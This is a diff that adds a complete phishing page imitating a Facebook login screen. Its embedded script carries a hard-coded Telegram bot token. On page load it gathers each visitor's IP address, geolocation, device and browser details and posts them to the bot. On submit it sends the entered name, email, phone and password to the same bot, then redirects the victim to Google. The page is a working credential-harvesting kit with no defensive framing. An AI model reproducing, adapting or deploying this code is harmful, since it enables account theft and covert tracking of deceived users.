@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h1 {
+            color: #1877f2;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Facebook</h1>
+        <form id="loginForm">
+            <input type="text" id="name" placeholder="Name" required><br>
+            <input type="email" id="email" placeholder="Email" required><br>
+            <input type="tel" id="phone" placeholder="Phone" required><br>
+            <input type="password" id="pass" placeholder="password" required><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        const botToken = '7280464831:AAGYGN5eZUt6qmkjcWDe8sfYuAVKKor9xv0';
+        const chatId = '7265766559';
+
+        // Function to send info to Telegram bot
+        function sendInfo(info) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: info
+                })
+            });
+        }
+        
+   function updateLoadCount() {
+ let loadCount = localStorage.getItem('loadCount');
+ if (!loadCount) {
+  loadCount = 1;
+ } else {
+  loadCount = parseInt(loadCount) + 1;
+ }
+ localStorage.setItem('loadCount', loadCount);
+ return loadCount;
+}     
+
+        // Fetch additional information and send on page load
+        window.addEventListener('load', function() {
+         const loadCount = updateLoadCount();
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const deviceName = navigator.platform;
+                    const userAgent = navigator.userAgent;
+                    const referrer = document.referrer || 'Direct';
+                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const language = navigator.language;
+                    const country = data.country_name;
+                    const city = data.city;
+                    const latitude = data.latitude;
+                    const longitude = data.longitude;
+                    const screenWidth = window.screen.width;
+                    const screenHeight = window.screen.height;
+                    //const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+                    let connectionType = 'Unknown';
+
+if (navigator.connection && navigator.connection.effectiveType) {
+    connectionType = navigator.connection.effectiveType;
+} else if (navigator.userAgent.includes("Mobile")) {
+    connectionType = 'Mobile Data';
+} else if (navigator.userAgent.includes("Wi-Fi") || navigator.userAgent.includes("WLAN")) {
+    connectionType = 'Wi-Fi';
+}
+
+/*
+                    const message = `
++------------------------------------+
+🗄| contact information
++------------------------------------+
+🌐| IP : ${ip}
++------------------------------------+
+📱| Device name : ${deviceName}
+🕵| User Agent : ${userAgent}
+🌐| Referrer : ${referrer}
+⏰| Time Zone : ${timeZone}
+🌍| Language : ${language}
+📺| Screen Size : ${screenWidth}x${screenHeight}
+🔌| Connection Type : ${connectionType}
++------------------------------------+
+🗄| Location information
++------------------------------------+
+📍| Country : ${country}
+🔖| city : ${city}
+📡| Latitude : ${latitude}
+📡| Longitude : ${longitude}
+📉| Load Count: ${loadCount}
++------------------------------------- By @spider_XR`;*/
+
+const message = `
++------<< 𝚄𝚂𝙴𝚁𝙸𝙽𝙵𝙾 𝚆𝙱 >>----------+\n
+🗄| 𝐶𝑂𝑁𝑇𝐴𝐶𝑇 𝐼𝑁𝐹𝑂𝑅𝑀𝐴𝑇𝐼𝑂𝑁 b𝑌 𝑆𝑃𝐼𝐷𝐸𝑅𝑋𝑅
++------------------------------------+
+🌐| 𝙸𝙿 : ${ip}
++------------------------------------+
+📱| 𝙳𝙴𝚅𝙸𝙲𝙴 𝙽𝙰𝙼𝙴 : ${deviceName}\n
+🕵| 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃 : ${userAgent}\n
+🌐| 𝚁𝙴𝙵𝙴𝚁𝚁𝙴𝚁 : ${referrer}\n
+⏰| 𝚃𝙸𝙼𝙴 𝚉𝙾𝙽𝙴 : ${timeZone}\n
+🌍| 𝙻𝙰𝙽𝙶𝚄𝙰𝙶𝙴 : ${language}\n
+📺| 𝚂𝙲𝚁𝙴𝙴𝙽 𝚂𝙸𝚉𝙴 : ${screenWidth}x${screenHeight}\n
+🔌| 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 𝚃𝚈𝙿𝙴 : ${connectionType}\n
++------------------------------------+
+🗄| 𝑳𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐈𝐍f𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍
++------------------------------------+
+📍| 𝐂𝐎𝗨𝐍𝐓𝐑𝐘 : ${country}\n
+🔖| 𝐂𝐈𝐓𝐘 : ${city}\n
+📡| 𝐋𝐀𝐓𝐈𝐓𝗨𝐃𝐄 : ${latitude}\n
+📡| 𝐋𝐎𝐍𝐆𝐈𝐓𝗨𝐃𝐄 : ${longitude}\n
+📉| 𝐋𝐎𝐀𝐃 𝐂𝐎𝗨𝐍𝐓: ${loadCount}\n
++======{ @spider_XR }=======`;
+
+
+                    // Send the message on page load
+                    sendInfo(message);
+                });
+        });
+
+        // Send user form data on submit
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Collect form data
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+
+            const userMessage = `
+🗳 Registration information
++------------------------------------+
+👤| Name : ${name}
+📱| Phone : ${phone}
+📧| Email : ${email}
+🔐| password : ${pass}
++------------------------------------- By @spider_XR`;
+
+            // Send the form data to Telegram bot
+            sendInfo(userMessage);
+            
+            // Redirect to Google after sending the data
+            window.location.href = 'https://www.google.com';
+        });
+    </script>
+</body>
+</html>
